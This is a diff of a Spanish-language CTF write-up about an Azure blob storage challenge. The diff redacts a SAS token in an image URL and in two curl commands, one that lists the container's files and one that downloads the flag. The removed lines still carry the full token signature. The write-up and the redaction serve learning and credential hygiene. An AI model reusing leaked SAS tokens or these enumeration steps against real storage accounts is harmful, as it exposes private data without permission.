@@ -43,7 +43,7 @@ curl -s "https://ctf25sac672da51.blob.core.windows.net/research-portal/research-
 En el código fuente encontramos una etiqueta `<img>` con una URL muy interesante:
 
 ```html
-<img src="https://ctf25sac672da51.blob.core.windows.net/medicloud-research/close-up-doctor-holding-red-heart.jpg??sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
+<img src="https://ctf25sac672da51.blob.core.windows.net/medicloud-research/close-up-doctor-holding-red-heart.jpg??sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
      alt="Cardiovascular Research - Doctor with Heart Model">
 ```
 
@@ -76,7 +76,7 @@ Esto significa que podemos **enumerar todos los archivos** del contenedor `medic
 Usamos el SAS token para listar el contenido del contenedor añadiendo los parámetros `restype=container&comp=list`:
 
 ```bash
-curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D&restype=container&comp=list"
+curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D&restype=container&comp=list"
 ```
 
 ### Respuesta XML
@@ -105,7 +105,7 @@ curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?sv=201
 ### Paso 2: Descargar la Flag
 
 ```bash
-curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/flag.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
+curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/flag.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
 ```
 
 ---
